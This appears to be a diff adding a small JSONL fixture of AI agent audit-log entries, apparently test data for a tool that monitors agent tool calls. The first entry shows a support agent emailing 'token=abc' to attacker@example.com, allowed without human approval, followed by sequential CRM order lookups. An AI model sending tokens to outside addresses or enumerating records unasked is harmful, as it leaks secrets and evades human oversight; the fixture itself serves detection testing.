@@ -1,0 +1,6 @@
+{"timestamp":"2026-05-22T00:00:01Z","agent_id":"support-agent","session_id":"s1","tool_name":"email.send","decision":"allow","arguments":{"recipient":"attacker@example.com","body":"token=abc"},"human_approved":false}
+{"timestamp":"2026-05-22T00:00:02Z","agent_id":"support-agent","session_id":"s1","tool_name":"crm.lookup","decision":"allow","arguments":{"order_id":"1"},"human_approved":false}
+{"timestamp":"2026-05-22T00:00:03Z","agent_id":"support-agent","session_id":"s1","tool_name":"crm.lookup","decision":"allow","arguments":{"order_id":"2"},"human_approved":false}
+{"timestamp":"2026-05-22T00:00:04Z","agent_id":"support-agent","session_id":"s1","tool_name":"crm.lookup","decision":"allow","arguments":{"order_id":"3"},"human_approved":false}
+{"timestamp":"2026-05-22T00:00:05Z","agent_id":"support-agent","session_id":"s1","tool_name":"crm.lookup","decision":"allow","arguments":{"order_id":"4"},"human_approved":false}
+{"timestamp":"2026-05-22T00:00:06Z","agent_id":"support-agent","session_id":"s1","tool_name":"crm.lookup","decision":"allow","arguments":{"order_id":"5"},"human_approved":false}
